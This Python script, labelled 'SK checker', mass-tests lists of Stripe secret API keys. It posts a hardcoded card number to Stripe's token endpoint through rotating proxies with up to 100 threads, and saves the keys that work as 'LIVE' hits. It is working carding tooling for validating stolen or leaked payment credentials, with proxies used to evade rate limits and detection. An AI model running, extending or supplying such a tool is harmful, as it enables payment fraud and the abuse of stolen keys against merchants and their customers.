import os
import time
import json
import requests
import random
from datetime import date, datetime
from requests.auth import HTTPBasicAuth
from concurrent.futures import ThreadPoolExecutor, as_completed

from questionary import Style
import questionary
import os

mainscreen = '''

\t ______     __  __        ______     __  __     ______     ______     __  __     ______     ______    
\t/\  ___\   /\ \/ /       /\  ___\   /\ \_\ \   /\  ___\   /\  ___\   /\ \/ /    /\  ___\   /\  == \   
\t\ \___  \  \ \  _"-.     \ \ \____  \ \  __ \  \ \  __\   \ \ \____  \ \  _"-.  \ \  __\   \ \  __<   
\t \/\_____\  \ \_\ \_\     \ \_____\  \ \_\ \_\  \ \_____\  \ \_____\  \ \_\ \_\  \ \_____\  \ \_\ \_\ 
\t  \/_____/   \/_/\/_/      \/_____/   \/_/\/_/   \/_____/   \/_____/   \/_/\/_/   \/_____/   \/_/ /_/ 
                                                                                         
\t                                    \033[32mm a d e  b y  a d i t y a\033[39m 
\n'''

custom_style_fancy = Style([
    ('qmark', 'fg:#673ab7 bold'),       # token in front of the question
    ('question', 'bold'),               # question text
    ('answer', 'fg:#f44336 bold'),      # submitted answer text behind the question
    ('pointer', 'fg:#673ab7 bold'),     # pointer used in select and checkbox prompts
    ('highlighted', 'fg:#673ab7 bold'), # pointed-at choice in select and checkbox prompts
    ('selected', 'fg:#cc5454'),         # style for a selected item of a checkbox
    ('separator', 'fg:#cc5454'),        # separator in lists
    ('instruction', ''),                # user instructions for select, rawselect, checkbox
    ('text', ''),                       # plain text
    ('disabled', 'fg:#858585 italic')   # disabled choices for select and checkbox prompts
])

os.system("cls")
print(mainscreen)

answers = questionary.form(
    first = questionary.path("stripe keys file ?", default="keys.txt", style=custom_style_fancy),
    second = questionary.text("How many threads you want to use?",default=str(100),style=custom_style_fancy),
    third = questionary.path("proxies file ?" ,default="proxies.txt", style=custom_style_fancy),
    fourth = questionary.text("Authentication User:pass ?",instruction="(leave empty for no authentication)"),
).ask()

file1 = open(answers['third'], "r")
ip_port = file1.readlines()

try:
    userpass = answers['fourth'].split(":")
    proxy = {'http': f'http://{userpass[0]}:{userpass[1]}@{random.choice(ip_port)}'}
    print("\033[32mChecking Keys.... \033[39m")
except IndexError:
    proxy = {'http': f'{random.choice(ip_port)}'}
    print("\033[32mChecking Keys.... \033[39m")


def job(sk_live):
    
    url = "https://api.stripe.com/v1/tokens"
    data = {
        'card[number]': '4888230002612218',
        'card[exp_month]': '12',
        'card[exp_year]': '2026',
        'card[cvc]': '994'

    }

    req = requests.post(url=url, data=data, proxies=proxy, auth=HTTPBasicAuth(f'{sk_live}', ''))
    return req.text, sk_live

my_file = open(answers['first'], "r")
keys_list = my_file.readlines()


processes = []
startTime = time.time()
with ThreadPoolExecutor(max_workers=int(answers['second'])) as executor:
    for key in keys_list:
        processes.append(executor.submit(job, key))

timetook = time.time()-startTime

lives = 0
rates = 0
dead = 0  

for task in as_completed(processes):
    output = task.result()
    outputjson = json.loads(output[0])
    #print(outputjson)
    path = f"hits/{date.today()}/"
    os.makedirs(os.path.dirname(path), exist_ok=True)
    try:
        if outputjson['id']:
            output_str = f'''
Status: LIVE
Stripe key: {output[1]}
========================'''
            file1 = open(f"{path}/{datetime.now().strftime('%H-%M-%S')}.txt","a")
            file1.writelines(output_str)
            lives = lives+1
            
    except KeyError as e:
        try:
            if outputjson['error']['code'] == "rate_limit":
                output_rate = f'''
Status: RATE LIMIT
Stripe key: {output[1]}
========================'''
                file1 = open(f"{path}/{datetime.now().strftime('%H-%M-%S')}.txt","a")
                file1.writelines(output_rate)
                rates = rates+1
                
        except KeyError:        
            if outputjson['error']['message']:
                dead=dead+1
        
    else:
        pass
        #print(outputjson)
        
    
print("\nSK checking completed in "+str(round(timetook, 2))+" seconds")
status = f'''\t\033[32mLIVES       \033[39m= {lives}
\t\033[33mRATE LIMITS \033[39m= {rates}
\t\033[31mDEAD        \033[39m= {dead}
'''
print(status)